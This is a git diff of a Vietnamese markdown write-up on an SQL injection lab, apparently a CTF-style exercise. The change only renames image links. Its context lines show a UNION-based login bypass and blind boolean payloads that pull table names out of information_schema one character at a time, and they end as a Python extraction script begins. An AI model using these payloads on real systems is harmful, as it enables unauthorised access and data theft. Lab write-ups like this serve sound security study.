@@ -5,7 +5,7 @@ username=/&password=) union select 'admin' #
 ```
 
 # Level 5:
-![691](images/sql_injection_pipeline-level%205.png)
+![691](sql_injection_pipeline-level-5.png)
 ```php
 <?php
 function loginHandler($username, $password)
@@ -59,14 +59,14 @@ SUBSTRING((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_
 ```sql
 (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=0x706f7374735f6462)=1 #
 ```
-![[images/Pasted image 20260820154615.png]]
+![[images/7-ky-tu.png]]
 
 ```sql
 -- exfiltrate từng ký tự trong bảng có tên không phải là 'posts'
 SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='posts_db' AND table_name != 'posts' LIMIT 0,1),1,1) = 'a' #
 ```
 - đã thử thành công với vị trí số 1:
-![[images/Pasted image 20260820154747.png]]
+![[images/Xac-dinh-ky-tu-dau-tien.png]]
 - bây giờ là viết script python để exfiltrate hết toàn bộ 7 ký tự (có thể làm tay nhưng viết script đi cho giống hắc cơ)
 ```python
 import requests
